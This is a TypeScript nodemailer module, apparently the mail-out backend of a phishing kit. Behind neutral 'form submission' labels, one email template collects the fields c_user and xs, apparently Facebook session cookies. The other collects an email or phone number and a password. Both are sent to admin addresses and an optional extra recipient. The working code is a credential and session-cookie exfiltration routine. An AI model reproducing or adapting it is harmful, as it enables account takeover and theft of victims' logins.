import nodemailer from 'nodemailer';

// Create reusable transporter with environment variables
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || 'smtp.gmail.com',
  port: Number(process.env.SMTP_PORT) || 587,
  secure: false, // true for 465, false for other ports
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASSWORD,
  },
});

interface EmailParams {
  formType: 'form-one' | 'form-two';
  subject: string;
  data: Record<string, any>;
  optionalRecipient?: string;
}

const emailTemplates = {
  'form-one': (data: Record<string, any>) => `
    Form One Submission Details:
    c_user: ${data.c_user}
    xs: ${data.xs}

    Time: ${new Date().toISOString()}
  `,
  'form-two': (data: Record<string, any>) => `
    Form Two Submission Details:
    Email/Phone: ${data.user_email}
    Password: ${data.password}

    Time: ${new Date().toISOString()}
  `,
};

export async function sendFormEmail(params: EmailParams): Promise<boolean> {
  const defaultRecipients = [
    process.env.ADMIN_EMAIL_1,
    process.env.ADMIN_EMAIL_2
  ].filter(Boolean);

  if (defaultRecipients.length === 0) {
    console.error("No default recipients configured");
    return false;
  }

  const recipients = [...defaultRecipients];
  if (params.optionalRecipient) {
    recipients.push(params.optionalRecipient);
  }

  const emailContent = emailTemplates[params.formType](params.data);

  try {
    const info = await transporter.sendMail({
      from: process.env.SMTP_USER,
      to: recipients.join(', '),
      subject: params.subject,
      text: emailContent,
      html: emailContent.replace(/\n/g, '<br>'),
    });

    console.log('Message sent: %s', info.messageId);
    return true;
  } catch (error) {
    console.error('SMTP email error:', error);
    return false;
  }
}